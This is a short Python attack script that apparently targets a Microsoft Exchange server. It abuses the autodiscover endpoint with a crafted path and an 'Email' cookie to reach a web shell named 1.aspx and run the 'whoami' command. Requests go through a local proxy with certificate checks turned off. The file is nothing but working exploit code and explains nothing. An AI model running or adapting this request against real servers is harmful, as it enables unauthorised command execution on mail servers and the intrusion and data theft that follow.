import requests

base_url="https://10.0.102.210"
original_url="autodiscover/1.aspx?cmd=whoami"
headers={}
cookies={}
proxies={"https":"http://127.0.0.1:8080"}

headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
cookies["Email"] = "autodiscover/autodiscover.json?a=ictbv@pshke.pov"
url = base_url + "/autodiscover/autodiscover.json?a=ictbv@pshke.pov/%s" % original_url
r=requests.get(url,headers=headers,cookies=cookies,verify=False,proxies=proxies)
print(r.text)